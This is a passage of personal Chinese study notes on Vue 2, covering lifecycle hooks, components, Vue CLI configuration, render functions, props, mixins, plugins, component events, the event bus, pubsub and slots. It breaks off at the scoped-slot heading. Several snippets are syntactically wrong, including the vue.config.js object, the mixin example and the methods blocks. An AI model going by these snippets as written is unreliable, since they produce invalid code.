> 实例已经创建完成之后被调用，在这一步，实例已完成以下配置：数据监测、数据代理、属性和方法的运算，watch/event 事件回调，完成了data 数据的初始化，el没有。 然而，挂在阶段还没有开始, $el属性目前不可见，这是一个常用的生命周期，因为你可以调用methods中的方法，改变data中的数据，并且修改可以通过vue的响应式绑定体现在页面上，，获取computed中的计算属性等等，通常我们可以在这里对实例进行预处理，也有一些童鞋喜欢在这里发ajax请求，值得注意的是，这个周期中是没有什么方法来对实例化过程进行拦截的，因此假如有某些数据必须获取才允许进入页面的话，并不适合在这个方法发请求，建议在组件路由钩子`beforeRouteEnter`  中完成
>
> ### beforeMount
>
> 挂在开始之前被调用，相关的render函数首次被调用（虚拟DOM），实例已完成以下的配置： 编译模板，把data里面的数据和模板生成html，完成了el和data 初始化，注意此时还没有挂在html到页面上。
>
> ### mounted
>
> 挂载完成，也就是模板中的HTML渲染到HTML页面中，此时一般可以做一些ajax操作，mounted只会执行一次。
>
> ### beforeUpdate
>
> 在数据更新之前被调用，发生在虚拟DOM重新渲染和打补丁之前，可以在该钩子中进一步地更改状态，不会触发附加地重渲染过程
>
> ### updated（更新后）
>
> 在由于数据更改导致地虚拟DOM重新渲染和打补丁只会调用，调用时，组件DOM已经更新，所以可以执行依赖于DOM的操作，然后在大多是情况下，应该避免在此期间更改状态，因为这可能会导致更新无限循环，该钩子在服务器端渲染期间不被调用
>
> ### beforeDestroy（销毁前）
>
> 在实例销毁之前调用，实例仍然完全可用，
>
> 1. 这一步还可以用this来获取实例，可以访问到数据，调用方法，但是所有对数据的修改都不能更新
> 2. 一般在这一步做一些重置的操作，比如清除掉组件中的定时器  和 监听的dom事件
>
> ### destroyed（销毁后）
>
> 在实例销毁之后调用，调用后，所以的事件监听器会被移出，所有的子实例也会被销毁，该钩子在服务器端渲染期间不被调用

#### 总结

> 常用的生命周期钩子：
>
> ​            1.mounted: 发送ajax请求、启动定时器、绑定自定义事件、订阅消息等【初始化操作】。
>
> ​            2.beforeDestroy: 清除定时器、解绑自定义事件、取消订阅消息等【收尾工作】。
>
> 
>
> ​        关于销毁Vue实例
>
> ​            1.销毁后借助Vue开发者工具看不到任何信息。
>
> ​            2.销毁后自定义事件会失效，但原生DOM事件依然有效。
>
> ​            3.一般不会在beforeDestroy操作数据，因为即便操作数据，也不会再触发更新流程了。

## vue组件

### 对组件的理解

![image-20220227190647136](C:\Users\Sagittarius\AppData\Roaming\Typora\typora-user-images\image-20220227190647136.png)

![image-20220227191013794](C:\Users\Sagittarius\AppData\Roaming\Typora\typora-user-images\image-20220227191013794.png)

#### 组件的定义

实现应用中**局部**功能**代码**(html/css/js)和**资源**(mp3/mp4/ttf/.zip)的**集合**

### 非单文件组件

#### 基本使用

> Vue中使用组件的三大步骤：
>
> ​          一、定义组件(创建组件)：`Vue.extend()`
>
> ​          二、注册组件： `components`
>
> ​          三、使用组件(写组件标签)： `<组件名></组件名>`
>
> 
>
>  一、如何定义一个组件？
>
> ​            使用Vue.extend(options)创建，其中options和new Vue(options)时传入的那个options几乎一样，但也有点区别；
>
> ​            区别如下：
>
> ​                1.el不要写，为什么？ ——— 最终所有的组件都要经过一个vm的管理，由vm中的el决定服务哪个容器。
>
> ​                2.data必须写成函数，为什么？ ———— 避免组件被复用时，数据存在引用关系。
>
> ​            备注：使用template可以配置组件结构。
>
> 
>
> 二、如何注册组件？
>
> ​              1.局部注册：靠new Vue的时候传入components选项
>
> ​              2.全局注册：靠Vue.component('组件名',组件)
>
> 
>
>  三、编写组件标签：
>
> ​              <school></school>

```html
<div id="root">
    <!-- 编写组件标签 -->
    <school></school>
    <hr>
    <student></student>
</div>
<script>
    Vue.config.productionTip = false
    //创建组件
    const school = Vue.extend({
        template:`
            <div>
                <h2>学校：{{name}}</h2>
                <h2>地址：{{address}}</h2>
    </div>`,
        data(){
            return {
                name: 'jiaoda',
                address:'beijing'
            }
        }    
    })

    const student = Vue.extend({
        template:`
            <div>
                <h2>学生：{{name}}</h2>
                <h2>地址：{{address}}</h2>
    </div>`,
        data(){
            return {
                name: 'lisa',
                address:'thailand'
            }
        }
    })
    new Vue({
        el:'#root',
        //注册组件
        components:{
            school,
            student
        }
    })
</script>
```

#### 注意事项

> 1.关于组件名:
>
> ​                一个单词组成：
>
> ​                      第一种写法(首字母小写)：school
>
> ​                      第二种写法(首字母大写)：School
>
> ​                多个单词组成：
>
> ​                      第一种写法(kebab-case命名)：my-school
>
> ​                      第二种写法(CamelCase命名)：MySchool (需要Vue脚手架支持)
>
> ​                备注：
>
> ​                    (1).组件名尽可能回避HTML中已有的元素名称，例如：h2、H2都不行。
>
> ​                    (2).可以使用name配置项指定组件在开发者工具中呈现的名字。
>
> 
>
>  2.关于组件标签:
>
> ​                第一种写法：<school></school>
>
> ​                第二种写法：<school/>
>
> ​                备注：不用使用脚手架时，<school/>会导致后续组件不能渲染。
>
> 
>
> 3.一个简写方式：
>
> ​                const school = Vue.extend(options) 可简写为：const school = options

#### 组件的嵌套

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>组件嵌套</title>
    <link rel="shortcut icon" href="../aigei.ico" type="image/x-icon">
    <script src="../js/vue.js"></script>
</head>
<body>
    <div id="root">
        <!-- 编写组件标签 -->
        <school></school>
        <hr>
        <hello></hello>
        <!-- <student></student> -->
    </div>
    <script>
        Vue.config.productionTip = false
        // student组件
        const student = Vue.extend({
            template:`
            <div>
                <h2>学生：{{name}}</h2>
                <h2>地址：{{address}}</h2>
            </div>`,
            data(){
                return {
                    name: 'lisa',
                    address:'thailand'
                }
            }
        })
        //School组件
        const school = Vue.extend({
            template:`
            <div>
                <h2>学校：{{name}}</h2>
                <h2>地址：{{address}}</h2>
                <student></student>
            </div>`,
            data(){
                return {
                    name: 'jiaoda',
                    address:'beijing'
                }
            },
            components:{
                student
            }   
        })
        // hello组件
        const hello = Vue.extend({
            template:`
            <h2> {{msg}} </h2>`,
            data(){
                return {
                    msg :'hello,lisa'
                }
            }
        })
        //app组件
        const app = Vue.extend({
            template:`
            <div>
                <hello></hello>
                <school></school>
            </div>`,
            components:{
                school,
                hello
            }
            
        })
        new Vue({
            template:`
            <app></app>
            `,
            el:'#root',
            //注册组件
            components:{
                app
            }

        })
    </script>
</body>
</html>
```

#### VueComponent

> 1.school组件本质是一个名为VueComponent的构造函数，且不是程序员定义的，是Vue.extend生成的。
>
> 
>
> 2.我们只需要写<school/>或<school></school>，Vue解析时会帮我们创建school组件的实例对象，
>
> ​    即Vue帮我们执行的：new VueComponent(options)。
>
> 
>
> **3.特别注意：每次调用Vue.extend，返回的都是一个全新的VueComponent！！！！**
>
> 
>
> 4.关于this指向：
>
> ​	(1).**组件配置中**：
>
> ​         data函数、methods中的函数、watch中的函数、computed中的函数 它们的this均是【**VueComponent实例对象**】。
>
> ​	(2).**new Vue(options)配置中**：
>
> ​         data函数、methods中的函数、watch中的函数、computed中的函数 它们的this均是【**Vue实例对象**】。
>
> 
>
> 5.VueComponent的实例对象，以后简称vc（也可称之为：组件实例对象）。
>
> ​	Vue的实例对象，以后简称vm。

#### 分析vue和vuecomponent的关系

![image-20220227212909243](C:\Users\Sagittarius\AppData\Roaming\Typora\typora-user-images\image-20220227212909243.png)

## 使用vue脚手架

Vue 脚手架是 Vue 官方提供的标准化开发工具（开发平台）  

### 安装步骤

1. 第一步（仅第一次执行）：全局安装@vue/cli。`npm install -g @vue/cli`
2. 第二步：切换到**你要创建项目的目录**，然后使用命令创建项目 `vue create xxxx`  
3. 第三步：启动项目 `npm run serve`  
4. 注：Vue 脚手架隐藏了所有 webpack 相关的配置，若想查看具体的 webpakc 配置，请执行：vue inspect > output.js  

### 分析脚手架

> .gitignore : git的忽略文件，不想接受git的文件或文件夹，需要在这里配置
>
> babel.config.js : babel的控制文件，配置转换标准
>
> package.json : 只要打开的文件符合npm规范，一定存在，叫做包的说明书
>
> ​		 `"serve": "vue-cli-service serve" : 让vue帮自己配置好一个服务器`
>
>  ​		 `"build": "vue-cli-service build" : 构建 .html/.css/.js，执行编译`
>
> ​		 `"lint": "vue-cli-service lint": 进行语法检查`
>
> package-lock.json：包版本控制文件，控制安装版本
>
> main.js : 整个项目的入口文件
>
> asset：放静态资源
>
> 注：组件名必须采用multi-name

#### render函数

> 1.vue.js与vue.runtime.xxx.js的区别：
>
> ​        (1).vue.js是完整版的Vue，包含：核心功能+模板解析器（体积大）。
>
> ​        (2).vue.runtime.xxx.js是运行版的Vue，只包含：核心功能；没有模板解析器。
>
> 
>
> 2.因为vue.runtime.xxx.js没有模板解析器，所以不能使用template配置项，需要使用
>
> ​      render函数接收到的createElement函数去指定具体内容。

##### 作用

`render 函数` 跟 `template` 一样都是创建 html 模板的，但是有些场景中用 `template` 实现起来代码冗长繁琐而且有大量重复，这时候就可以用 `render 函数`。`template`需要完整的vue.js，使用render可以只是用包含核心功能的vue

##### render 函数讲解

render 函数即**渲染函数**，它是个函数，它的参数也是个函数——即 `createElement`，我们重点来说 `createElement` 参数。

###### render 函数的返回值（VNode）

VNode（即：虚拟节点），也就是我们要渲染的节点。

###### render 函数的参数（createElement）

createElement 是 render 函数 的参数，它本身也是个函数，并且有三个参数。

###### createElement 函数的返回值（VNode）

createElement 函数的返回值是 VNode（即：虚拟节点）。

###### createElement 函数的参数（三个）

1. 一个 HTML 标签字符串，组件选项对象，或者解析上述任何一种的一个 async 异步函数。类型：{String | Object | Function}。必需。
2. 一个包含模板相关属性的数据对象你可以在 template 中使用这些特性。类型：{Object}。可选。
3. 子虚拟节点 (VNodes)，由 createElement() 构建而成，也可以使用字符串来生成“文本虚拟节点”。类型：{String | Array}。可选。

```js
 /**
  * render: 渲染函数
  * 参数: createElement
  * 参数类型: Function
 */
 render: function (createElement) {
   let _this = this['$options'].parent	// 我这个是在 .vue 文件的 components 中写的，这样写才能访问this
   let _header = _this.$slots.header   	// $slots: vue中所有分发插槽，不具名的都在default里
 
   return createElement(       
     // 1. 要渲染的标签名称：第一个参数【必需】      
     'div',   
     // 2. 1中渲染的标签的属性，详情查看文档：第二个参数【可选】
     {
       style: {
         color: '#333',
         border: '1px solid #ccc'
       }
     },
     // 3. 1中渲染的标签的子元素数组：第三个参数【可选】
     [
       'text',   // 文本节点直接写就可以
       _this.$slots.default,  // 所有不具名插槽，是个数组
       createElement('div', _header)   // createElement()创建的VNodes
     ]
   )
 }
```

### vue脚手架配置文件

1. 查看具体的 webpakc 配置，请执行：`vue inspect > output.js`

2. 修改默认配置，`vue.config.js` 是一个可选的配置文件，如果项目的 (和 `package.json` 同级的) 根目录中存在这个文件，那么它会被 `@vue/cli-service` 自动加载，输入以下修改：

   ```js
   module.exports = {
     pages: {
       index: {
         // page 的入口
         entry: 'src/index/main.js',
         // 模板来源
         template: 'public/index.html',
         // 在 dist/index.html 的输出
         filename: 'index.html',
         // 当使用 title 选项时，
         // template 中的 title 标签需要是 <title><%= htmlWebpackPlugin.options.title %></title>
         title: 'Index Page',
         // 在这个页面中包含的块，默认情况下会包含
         // 提取出来的通用 chunk 和 vendor chunk。
         chunks: ['chunk-vendors', 'chunk-common', 'index']
       },
       // 当使用只有入口的字符串格式时，
       // 模板会被推导为 `public/subpage.html`
       // 并且如果找不到的话，就回退到 `public/index.html`。
       // 输出文件名会被推导为 `subpage.html`。
       subpage: 'src/subpage/main.js'
     },
       lintOnSave : false;//关闭语法检查
   }
   ```

3. 关闭语法检查

   ```js
   //在pages之后平级输入
   lintOnSave : false;//关闭语法检查
   ```

###  **ref属性**

1.  被用来给元素或子组件注册引用信息（id的替代者）
2.  应用在html标签上获取的是真实DOM元素，应用在组件标签上是组件实例对象（vc）
3.  使用方式：
   -   打标识：```<h1 ref="xxx">.....</h1>``` 或 ```<School ref="xxx"></School>```
   -   获取：```this.$refs.xxx```

```vue
<template>
	<div>
		<h1 v-text="msg" ref="title"></h1>
		<button ref="btn" @click="showDOM">点我输出上方的DOM元素</button>
		<School ref="sch"/>
	</div>
</template>

<script>
	//引入School组件
	import School from './components/School'

	export default {
		name:'App',
		components:{School},
		data() {
			return {
				msg:'欢迎学习Vue！'
			}
		},
		methods: {
			showDOM(){
				console.log(this.$refs.title) //真实DOM元素
				console.log(this.$refs.btn) //真实DOM元素
				console.log(this.$refs.sch) //School组件的实例对象（vc）
			}
		},
	}
</script>
```



### props配置项

1. 功能：让组件接收外部传过来的数据

2. 传递数据：```<Demo name="xxx"/>```

3. 接收数据：

    1. 第一种方式（只接收）：```props:['name'] ```

    2. 第二种方式（限制类型）：```props:{name:String}```

    3. 第三种方式（限制类型、限制必要性、指定默认值）：

        ```js
        props:{
        	name:{
        	type:String, //类型
        	required:true, //必要性
        	default:'老王' //默认值
        	}
        }
        ```

    > 备注：props是只读的，Vue底层会监测你对props的修改，如果进行了修改，就会发出警告，若业务需求确实需要修改，那么请复制props的内容到data中一份，然后去修改data中的数据
    >
    > 
    >
    > 所有的 prop 都使得其父子 prop 之间形成了一个单向下行绑定：父级 prop 的更新会向下流动到子组件中，但是反过来则不行。

### mixin

1. 功能：可以把多个组件共用的配置提取成一个混入对象

2. 使用方式：

    第一步定义混合：

    ```
    {
        data(){....},
        methods:{....}
        ....
    }
    ```

    第二步使用混入：

    ​	全局混入：```Vue.mixin(xxx)```
    ​	局部混入：`mixins:['xxx']`	

```js
//mixin.js
//分别暴露
export const hunhe = {
	methods:{
		showName(){
			console.log(this.name)
		}
	}
}
//.vue
import {hunhe} from './mixin.js'
new vue={
    data{...},
    mixins:[hunhe]//必须用数组的形式
}

//全局混合
//App.vue
import {hunhe} from './mixin.js'
Vue.mixin(hunhe)
```

### 插件
1. 功能：用于增强Vue

2. 本质：包含install方法的一个对象，install的第一个参数是Vue，第二个以后的参数是插件使用者传递的数据。

3. 定义插件：

    ```js
    对象.install = function (Vue, options) {
        // 1. 添加全局过滤器
        Vue.filter(....)
    
        // 2. 添加全局指令
        Vue.directive(....)
    
        // 3. 配置全局混入(合)
        Vue.mixin(....)
    
        // 4. 添加实例方法
        Vue.prototype.$myMethod = function () {...}
        Vue.prototype.$myProperty = xxxx
    }
    ```

4. 使用插件：`Vue.use()`

### scoped样式

1. 作用：让样式在局部生效，防止冲突。引入顺序为准
2. 写法：`<style scoped>`

### webStorage

1. 存储内容大小一般支持5MB左右（不同浏览器可能还不一样）

2. 浏览器端通过 Window.sessionStorage 和 Window.localStorage 属性来实现本地存储机制。

3. 相关API：

    1. ```xxxxxStorage.setItem('key', 'value');```
        				该方法接受一个键和值作为参数，会把键值对添加到存储中，如果键名存在，则更新其对应的值。

    2. ```xxxxxStorage.getItem('person');```

        ​		该方法接受一个键名作为参数，返回键名对应的值。

    3. ```xxxxxStorage.removeItem('key');```

        ​		该方法接受一个键名作为参数，并把该键名从存储中删除。

    4. ``` xxxxxStorage.clear()```

        ​		该方法会清空存储中的所有数据。

4. 备注：

    1. SessionStorage存储的内容会随着浏览器窗口关闭而消失。
    2. LocalStorage存储的内容，需要手动清除才会消失。
    3. ```xxxxxStorage.getItem(xxx)```如果xxx对应的value获取不到，那么getItem的返回值是null。
    4. ```JSON.parse(null)```的结果依然是null。

### 组件的自定义事件

1. 一种组件间通信的方式，适用于：<strong style="color:red">子组件 ===> 父组件</strong>

2. 使用场景：A是父组件，B是子组件，B想给A传数据，那么就要在A中给B绑定自定义事件（<span style="color:red">事件的回调在A中</span>）。

3. 绑定自定义事件：

    1. 第一种方式，在父组件中：```<Demo @atguigu="test"/>```  或 ```<Demo v-on:atguigu="test"/>```

    2. 第二种方式，在父组件中：

        ```js
        <Demo ref="demo"/>
        ......
        mounted(){
           this.$refs.xxx.$on('atguigu',this.test)
        }
        ```

    3. 若想让自定义事件只能触发一次，可以使用```once```修饰符，或```$once```方法。

4. 触发自定义事件：```this.$emit('atguigu',数据)```		

5. 解绑自定义事件```this.$off('atguigu')```

6. 组件上也可以绑定原生DOM事件，需要使用```native```修饰符。

7. 注意：通过```this.$refs.xxx.$on('atguigu',回调)```绑定自定义事件时，回调<span style="color:red">要么配置在methods中</span>，<span style="color:red">要么用箭头函数</span>，否则this指向会出问题！

### 全局事件总线（GlobalEventBus）

![image-20220228214536424](C:\Users\Sagittarius\AppData\Roaming\Typora\typora-user-images\image-20220228214536424.png)



1. 一种组件间通信的方式，适用于<span style="color:red">任意组件间通信</span>。

2. 原理：

   - 可以访问所有组件

   - 可以调用 $on,$emit,$off等方法，这些方法都在Vue的原型对象上

   - 利用`VueComponent.prototype.__proto__ ===Vue.prototype`

   - ```js
     const Demo = Vue.extend({})//构造一个vc的构造函数
     const d = new Demo()//产生一个vc实例对象
     Vue.prototype.x = d//给vc的原型对象上添加一个事件总线
     ```

   - 步骤麻烦，利用 `beforeCreate`这个钩子

2. 安装全局事件总线：

   ```js
   new Vue({
   	......
   	beforeCreate() {
   		Vue.prototype.$bus = this //安装全局事件总线，$bus就是当前应用的vm
   	},
       ......
   }) 
   ```

3. 使用事件总线：

   1. 接收数据：A组件想接收数据，则在A组件中给$bus绑定自定义事件，事件的<span style="color:red">回调留在A组件自身。</span>

      ```js
      methods(){
        demo(data){......}//事件触发时执行的回调函数
      }
      ......
      mounted() {
        this.$bus.$on('xxxx',this.demo)//绑定事件
      }
      ```

   2. 提供数据：```this.$bus.$emit('xxxx',数据)```

5. 最好在beforeDestroy钩子中，用$off去解绑<span style="color:red">当前组件所用到的</span>事件。

### 消息订阅与发布（pubsub）

1.   一种组件间通信的方式，适用于<span style="color:red">任意组件间通信</span>。

2. 使用步骤：

   1. 安装pubsub：```npm i pubsub-js```

   2. 引入: ```import pubsub from 'pubsub-js'```

   3. 接收数据：A组件想接收数据，则在A组件中订阅消息，订阅的<span style="color:red">回调留在A组件自身。</span>

      ```js
      //subscribe中的回调函数里包含2个参数，第一个是消息名，第二个是订阅的数据
      methods(){
        demo(msgDemo,data){......}
      }
      ......
      mounted() {
        this.pid = pubsub.subscribe('xxx',this.demo) //订阅消息
      }
      ```
   
   4. 提供数据：```pubsub.publish('xxx',数据)```
   
   5. 最好在beforeDestroy钩子中，用```PubSub.unsubscribe(pid)```去<span style="color:red">取消订阅。</span>

#### nextTick

1. 语法：```this.$nextTick(回调函数)```
2. 作用：在下一次 DOM 更新结束后执行其指定的回调。
3. 什么时候用：当改变数据后，要基于更新后的新DOM进行某些操作时，要在nextTick所指定的回调函数中执行。

### 插槽

#### 插槽

插槽就是子组件中的提供给父组件使用的一个[占位符](https://so.csdn.net/so/search?q=占位符&spm=1001.2101.3001.7020)，用<slot></slot> 表示，父组件可以在这个占位符中填充任何模板代码，如 HTML、组件等，填充的内容会替换子组件的<slot></slot>标签。

1. 子组件中放占位符

   ```vue
   <template>
       <div>
           <h1>今天天气状况：</h1>
           <slot></slot>
       </div>
   </template>
   <script>
       export default {
           name: 'child'
       }
   </script>
   ```

2. 父组件中填充内容

   ```vue
   <template>
       <div>
           <div>使用slot分发内容</div>
           <div>
               <child>
                   <div style="margin-top: 30px">多云，最高气温34度，最低气温28度，微风</div>
               </child>
           </div>
       </div>
   </template>
   <script>
       import child from "./child.vue";
       export default {
           name: 'father',
           components:{
               child
           }
       }
   </script>
   ```

#### 具名插槽

具名插槽其实就是给插槽取个名字。一个子组件可以放多个插槽，而且可以放在不同的地方，而父组件填充内容时，可以根据这个名字把内容填充到对应插槽中。

1. 子组件的代码，设置了两个插槽(header和footer)：

   ```vue
   <template>
       <div>
           <div class="header">
               <h1>我是页头标题</h1>
               <div>
                   <slot name="header"></slot>
               </div>
           </div>
           <div class="footer">
               <h1>我是页尾标题</h1>
               <div>
                   <slot name="footer"></slot>
               </div>
           </div>
       </div>
   </template>
    
   <script>
       export default {
           name: "child1"
       }
   </script>
    
   <style scoped>
    
   </style>
   ```

2. 父组件填充内容, 父组件通过 v-slot:[name] 或者#:[name]的方式指定到对应的插槽中

   ```vue
   <template>
   <div>
       <div>slot内容分发</div>
       <child1>
           <template slot="header">
               <p>我是页头的具体内容</p>
           </template>
           <template slot="footer">
               <p>我是页尾的具体内容</p>
           </template>
       </child1>
   </div>
   </template>
    
   <script>
       import child1 from "./child1.vue";
    
       export default {
           name: "father1",
           components: {
               child1
           }
       }
   </script>
    
   <style scoped>
    
   </style>
   ```

#### 作用域插槽